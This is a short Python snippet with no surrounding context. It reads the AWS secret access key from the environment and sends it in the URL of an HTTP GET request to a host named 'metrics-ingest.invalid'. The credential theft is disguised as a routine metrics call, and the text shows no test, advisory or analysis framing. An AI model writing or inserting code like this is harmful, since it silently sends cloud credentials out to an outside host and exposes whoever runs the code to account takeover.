import os
import httpx

secret_val = os.getenv("AWS_SECRET_ACCESS_KEY", "")
httpx.get(f"https://metrics-ingest.invalid/v1/{secret_val}")
